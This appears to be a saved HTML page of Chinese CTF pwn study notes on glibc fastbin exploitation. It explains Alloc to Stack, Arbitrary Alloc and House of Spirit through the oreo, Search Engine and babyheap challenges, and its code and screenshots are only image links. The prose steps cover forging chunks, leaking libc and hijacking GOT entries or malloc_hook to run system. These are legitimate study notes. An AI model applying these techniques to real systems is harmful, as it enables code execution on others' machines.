+<a name="7qf4hlid1082c4a7a9e01qmqhs">&nbsp;&nbsp;Alloc to Stack</a>
+</h3>
+<h3 class="topic">
+<a name="6e7776v10f09ltrrhuigb6bdov">&nbsp;&nbsp;&nbsp;介绍</a>
+</h3>
+<h3 class="topic">
+<a name="0q53eaet2j5o16jegldones40m">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/2n3hmgbf250c30q6hj8qfs3k01.png"></p>
+<h3 class="topic">
+<a name="0q735dqbi9gvs9m7897s0hr3u7">&nbsp;&nbsp;&nbsp;示例</a>
+</h3>
+<h3 class="topic">
+<a name="46knkm66gplm8ibs0f30rnh8cp">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/01975oht1acdsd5ghr0qmfjeb6.png"></p>
+<h3 class="topic">
+<a name="1aba17sd060l3fa436nrg6kkvm">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/0a325r2vdmlvjln4fu6kh72i9u.png"></p>
+<h3 class="topic">
+<a name="491h5kk0dsd32u8q69jqf0tdbc">&nbsp;&nbsp;&nbsp;总结</a>
+</h3>
+<h3 class="topic">
+<a name="12ie6u68ou36e58sll62dau8bc">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/6qiqqr2nc4ai9mnbpevbu4fbpu.png"></p>
+<h3 class="topic">
+<a name="3endsa8orpvra34dvu107kbuh2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用的关键点在于&#13;
+1、修改fast chunk中的fd指针&#13;
+2、在栈中构造fake chunk时需要构造满足要求的size字段</a>
+</h3>
+<h3 class="topic">
+<a name="1aetasuoblieu0rkvda2of5u11">&nbsp;&nbsp;Arbitrary Alloc</a>
+</h3>
+<h3 class="topic">
+<a name="10bs5n1vs67bt0v2pq2vs8toko">&nbsp;&nbsp;&nbsp;介绍</a>
+</h3>
+<h3 class="topic">
+<a name="17513039eu8fk81p8dtcnrbrbu">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/6g5n88tjv40okav9h27gc5egch.png"></p>
+<h3 class="topic">
+<a name="09dark008h9lu1b4363kdp7806">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;只要目标空间中存在合法的size域，就可以将该目标空间作为一个fake chunk，然后使用fast chunk的fd指针指向目标空间，从而将目标空间作为堆空间被分配</a>
+</h3>
+<h3 class="topic">
+<a name="1evargu1jods6n8rfkc1arqbm6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;与Alloc to Stack的区别在于fake chunk不仅仅可以构造在栈中，也可以构造在任意可写内存中，只要该内存空间拥有满足要求的size字段值</a>
+</h3>
+<h3 class="topic">
+<a name="1nth4bug4p23hbmf511v0bm022">&nbsp;&nbsp;&nbsp;示例</a>
+</h3>
+<h3 class="topic">
+<a name="3m2058nk0m74q5a43816pnkg9m">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/4t2esma9fjp0oqtrej6pj8akjn.png"></p>
+<h3 class="topic">
+<a name="0ncfdcg5eiu9170e2kpleiicoh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/35a0nkfsd8cacbnj0el03sv904.png"></p>
+<h3 class="topic">
+<a name="2upu594snl5lslhph6r63v6nh9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/0lvjmnjphvmdnabc4ntfoor0j5.png"></p>
+<h3 class="topic">
+<a name="393nfo39k7jas12pk95ra4pdqa">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/2rdqgfkbj4tucamrse51i7g8hs.png"></p>
+<h3 class="topic">
+<a name="7duejh7h2tdjb2dht46lo3m7o4">&nbsp;&nbsp;&nbsp;小总结</a>
+</h3>
+<h3 class="topic">
+<a name="1tf2pv3jg97m045rvqq2vo2tho">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/67r216uq7ms41vjalr301jbd42.png"></p>
+<h3 class="topic">
+<a name="0fqa156agk7inah2pultgjb3jk">&nbsp;&nbsp;实例</a>
+</h3>
+<h3 class="topic">
+<a name="1hn8cli7pgb67ladbiqejun755">&nbsp;&nbsp;&nbsp;2014 hack.lu oreo</a>
+</h3>
+<h3 class="topic">
+<a name="3crnp49j75qvr0itn01i6shvb1">&nbsp;&nbsp;&nbsp;&nbsp;基本分析</a>
+</h3>
+<h3 class="topic">
+<a name="2pmiqrq6mi467093itpf758u57">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/4d6qm8pc0ag2pekru0950pfm9k.png"></p>
+<h3 class="topic">
+<a name="78co2oh9p7d264mr4rrss6a87c">&nbsp;&nbsp;&nbsp;&nbsp;程序基本功能</a>
+</h3>
+<h3 class="topic">
+<a name="1h7s7c1glnl9p6c5vl5dkldnaj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/6r0j1mtptk2eot5dbar1mujhq8.png"></p>
+<h3 class="topic">
+<a name="1g1559avc5lus4eda99cc8675d">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/4o85o5nk5o94s2va0h8bavmnt3.png"></p>
+<h3 class="topic">
+<a name="2c86forn4fqs7o1qmbco8jd9qh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add函数中，当写入结构体中的name字段时存在溢出</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/02n46uvu1barcroud38t6l1v2u.png"></p>
+<h3 class="topic">
+<a name="7222o0oalhuu5o1il2i0j6l9eb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/521hcj616hh9v21vp02ulpdv9g.png"></p>
+<h3 class="topic">
+<a name="4acrd67edvqdnsnm31im7vtqe8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意对于fgets函数，其第一个参数为一个指针，最终写入的数据会保存到该指针指向的内存地址，这里dword_804a2a8是指针变量的地址，最终数据被写入到该指针变量指向的内存，而不是内存804a2a8</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/306v25ufiq7q8oks0gttgss2a5.png"></p>
+<h3 class="topic">
+<a name="1imt2soj3omj46h0m7m219lbfn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/1hs7vt4r5bl0eph6cpj45b6km0.png"></p>
+<h3 class="topic">
+<a name="2tnhs0rmdikjuue15hhovmnte3">&nbsp;&nbsp;&nbsp;&nbsp;程序基本利用思路</a>
+</h3>
+<h3 class="topic">
+<a name="7uqr4b21frjrf56ao7rbhnkfld">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;即使用House Of Spirit</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/47i34tv5593m3422i5otcduu7d.png"></p>
+<h3 class="topic">
+<a name="1mfu3vjeidhlc1ekn1kfpfs4sv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一步通过堆溢出漏洞泄露free函数地址</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/7u4k936jmeiov4sqeuvfioqfbv.png"></p>
+<h3 class="topic">
+<a name="7rtrcol8t73o5mkj19s9priljl">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二步在bss段中构造fakechunk的size字段和nextfakechunk的size字段，从而保证free(fakechunk)时绕过验证机制</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/1tkur82buaf8vc4amkejhm6l8u.png"></p>
+<h3 class="topic">
+<a name="5k7mp0pjiim9s3evblseia4tbi">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过leave_message功能伪造fakechunk中枪支结构体的next指针为0，从而保证fakechunk为最后一个被释放的chunk，并且伪造nextfakechunk的size字段为100，从而绕过检验</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/65te83vg3fh7vfd1esr01a8fu4.png"></p>
+<h3 class="topic">
+<a name="49dolfk0duvp5uem6hua7te6ob">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样的一步，在ctfwiki中对payload的构造有所不同，不理解这样构造的原因</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/6fn5de2hi52t6k78n1bl0u7bgk.png"></p>
+<h3 class="topic">
+<a name="45t1a9ct2pqma50sj4jncec3sq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当delete执行完毕后，fastbin中0x40对应的第一个chunk即为0x0804a2a0，即0x0804a2a8-8，即bss段的fakechunk</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/0j2bcl7lfg66q45a8u4p0dme2r.png"></p>
+<h3 class="topic">
+<a name="6ckipuulspf3e2k1hi8o5967oo">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过add()函数将内存0x0804a2a8处的数据覆盖为strlen@got，然后利用message()函数将0x0804a2a8处strlen@got所指向的数据修改为system函数的地址，又因为本身meaage()函数内部会调用strlen函数，则system函数会被执行</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/7lgbd7dubb22m0345s780s79ms.png"></p>
+<h3 class="topic">
+<a name="0bnf6t6k8ie537v3kq7l86n6n8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这一步中，也可以将内存0x0804a2a8处的数据覆盖为sscanf@got，然后sscanf@got表项中的内容修改为system函数的地址，当程序执行sscanf函数时，相当于执行system函数，并且可以将"/bin/sh"字符串的地址作为参数传递给system函数</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/73diqntptetegu3r8s5bmmjakv.png"></p>
+<h3 class="topic">
+<a name="31hnknml4sah3lunphuu96vd4f">&nbsp;&nbsp;&nbsp;&nbsp;相关资料</a>
+</h3>
+<h3 class="topic">
+<a href="https://blog.csdn.net/Pwnpanda/article/details/81637283" name="23vpcavubmvuc3pgjje8o4kq01">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://blog.csdn.net/Pwnpanda/article/details/81637283</a>
+</h3>
+<h3 class="topic">
+<a name="07r3pedhgdk3l5re44bipjrrkc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://bbs.pediy.com/thread-247214-1.htm</a>
+</h3>
+<h3 class="topic">
+<a href="https://blog.csdn.net/weixin_42151611/article/details/97891951" name="41o7h8rsisr8keamij32n301n6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://blog.csdn.net/weixin_42151611/article/details/97891951</a>
+</h3>
+<h3 class="topic">
+<a name="6ddpe37lg5kp00efu6v9rthajs">&nbsp;&nbsp;&nbsp;2015 9447 CTF : Search Engine（没有仔细看）</a>
+</h3>
+<h3 class="topic">
+<a name="7bgsp9p3l3s6v6pd40dt8d5van">&nbsp;&nbsp;&nbsp;&nbsp;基本信息</a>
+</h3>
+<h3 class="topic">
+<a name="5npvoblujo4u91ald9ide4b0tc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/7o6d4e69oqcvd5hd5r16tosqfs.png"></p>
+<h3 class="topic">
+<a name="6b68de1ck532g1t74p3vukjfhi">&nbsp;&nbsp;&nbsp;&nbsp;程序基本功能</a>
+</h3>
+<h3 class="topic">
+<a name="3jus1bps8kl8sl4vmuaen2rjho">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/6shlve6cnbapq9t82bkrmblvm3.png"></p>
+<h3 class="topic">
+<a name="0iu9odps9b9c67r8knq4icbk8h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/3h5shefle4tlbr2ua5nulaccht.png"></p>
+<h3 class="topic">
+<a name="08rl10tvibm1emgh67dfq1lfo2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/3f6rhuf53i9b44p1g18h72r0p3.png"></p>
+<h3 class="topic">
+<a name="19lmls56vi74d3p41aheeh0l81">&nbsp;&nbsp;&nbsp;&nbsp;漏洞</a>
+</h3>
+<h3 class="topic">
+<a name="6u6bojuqabsjpde9hnme0c4r5a">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/5u826i1d8ua7iu25e1ioqogj6h.png"></p>
+<h3 class="topic">
+<a name="15irgsc42aua56kc66cpbc7al6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/40654aee5mgftk54hub88g3oa9.png"></p>
+<h3 class="topic">
+<a name="0v7mlrl3svk5a901nt1bpev0cs">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/0r089dskeicbd6gd4fh7kkqag5.png"></p>
+<h3 class="topic">
+<a name="74uno18pb0h5cehrcppkl4mduo">&nbsp;&nbsp;&nbsp;&nbsp;漏洞利用</a>
+</h3>
+<h3 class="topic">
+<a name="55gcbgh6fllookgjdo7vc801u1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/7iq58b0qlte2o96n2bdghtks5l.png"></p>
+<h3 class="topic">
+<a name="7rij81rpr2dar7eor2k5l0o6s8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/4temsqv7pb91b70rqhdenv76nb.png"></p>
+<h3 class="topic">
+<a name="2gg4af4dsp3d6bfk03fn9a7nse">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/6a00dvn5i89bo1a34n3r7cfaf9.png"></p>
+<h3 class="topic">
+<a name="2t0idjquau49svh1jd30iqoakg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/67bqcls9e4mtqj9ko30i9f3br6.png"></p>
+<h3 class="topic">
+<a name="45p7acjdga001r5fb8s87opo2t">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/4u3himi553ddahu68g0uud0ddm.png"></p>
+<h3 class="topic">
+<a name="0ik7sid9q03q0hbjgrpbs41otb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/5ssimd24orf8s6c9tnf4slb8cn.png"></p>
+<h3 class="topic">
+<a name="363s512b24s3jef1roehemaebr">&nbsp;&nbsp;&nbsp;&nbsp;相关资料</a>
+</h3>
+<h3 class="topic">
+<a name="7mphnef9f3ij01o94a67pgha15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://bbs.pediy.com/thread-247219.htm</a>
+</h3>
+<h3 class="topic">
+<a name="2kp46ne05pmensa7k5a7m25qmh">&nbsp;&nbsp;&nbsp;2017 0ctf babyheap</a>
+</h3>
+<h3 class="topic">
+<a name="5etbehgioung0fqjm447jb957p">&nbsp;&nbsp;&nbsp;&nbsp;程序基本信息</a>
+</h3>
+<h3 class="topic">
+<a name="1mbev0e6iesmo2jidbk7famrhj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/43g61sms4120jm363ffbvf05jr.png"></p>
+<h3 class="topic">
+<a name="7o16k6830ubkiktp1l2e6pnagf">&nbsp;&nbsp;&nbsp;&nbsp;程序功能</a>
+</h3>
+<h3 class="topic">
+<a name="0ca1u37h51otjuhbbm1so9eu3c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/1nj9mm22d5huvq9shu6bkrpshg.png"></p>
+<h3 class="topic">
+<a name="6d3av799pbqof9t4diprp482mu">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;分配函数</a>
+</h3>
+<h3 class="topic">
+<a name="1r0ltmlh201hj1kap9obftsk7o">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/1car2866d6jsv87plfdv14kdrq.png"></p>
+<h3 class="topic">
+<a name="0id57mkat01b55e6b7ck39komt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/4nn8und3ms5bgp41enjoljl9kh.png"></p>
+<h3 class="topic">
+<a name="43kel88iaq20e67g7pno0uht9v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;填充函数</a>
+</h3>
+<h3 class="topic">
+<a name="1csea5f9ndkiqduf679sukkr56">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/5usplblnrqk9e2scaqp53qgju1.png"></p>
+<h3 class="topic">
+<a name="74pib5pulip64to06r52tah28m">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;释放函数与输出函数</a>
+</h3>
+<h3 class="topic">
+<a name="39vlg810fbbku2q6mj8jbm5vgr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/2u6r5dffpoccmg56704fvu7mrg.png"></p>
+<h3 class="topic">
+<a name="4dc4igfqojs4mennchccj4huq9">&nbsp;&nbsp;&nbsp;&nbsp;利用思路</a>
+</h3>
+<h3 class="topic">
+<a name="1he2d9aisav7h4v6coc1b1v75r">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/4m3v19i17oh0vkv23r0hn43um3.png"></p>
+<h3 class="topic">
+<a name="7l8mdttni622bt1fqp0me6n3p4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;泄露lib基地址</a>
+</h3>
+<h3 class="topic">
+<a name="03f6m9b8s6gsp8v0lheon0rpqs">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/3eoh1edge3o79e9ifdlne6hbtl.png"></p>
+<h3 class="topic">
+<a name="12jo8p6cq9from3alje7fbevmh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/4sff192sopei8ekf0ll9okfs10.png"></p>
+<h3 class="topic">
+<a name="3b417jrbhf32m06tm00aq19mqd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/3eaidjcblehu28321d8jkbvhhm.png"></p>
+<h3 class="topic">
+<a name="5g2fsga7kvc3nelh9mb7a0i5pg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/7b7ore7ilq90bkad0ab2n6mlrs.png"></p>
+<h3 class="topic">
+<a name="14r6qj6bbf4jl2uogh07uhe6mi">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过攻击我们可以得到Unsorted bin的首地址，通过Unsorted bin的地址与mian_arena的固定偏移，可以得到mian_arena的地址，通过mian_arena与libc的固定偏移，可以得到libc的加载基址</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/4v26mjkipstidb44ap49ea9am1.png"></p>
+<h3 class="topic">
+<a name="5vm3j1pp85e6jna4e2kqklrt7i">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/048hc6gtnv7u3nbbf4333f3qg6.png"></p>
+<h3 class="topic">
+<a name="4c6ah23kn00b46o9lqvasl0edg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在malloc_hook附近分配chunk，从而修改malloc_hook,当malloc函数执行时，执行被替换的malloc_hook函数</a>
+</h3>
+<h3 class="topic">
+<a name="5v788m130c81rhmilb7mqdbgdb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/2dt8tkvajd62k2187a6ug10doa.png"></p>
+<h3 class="topic">
+<a name="73qfib29sckqmehm86ulvgt0ia">&nbsp;&nbsp;相关题目与参考文献</a>
+</h3>
+<h3 class="topic">
+<a name="6tap9ins1pb2j6kkpb52vt9f1t">&nbsp;&nbsp;&nbsp;题目&#13;
+L-CTF2016&ndash;pwn200&#13;
+参考文献&#13;
+https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/&#13;
+http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html&#13;
+https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717</a>
+</h3>
+</body>
+</html>
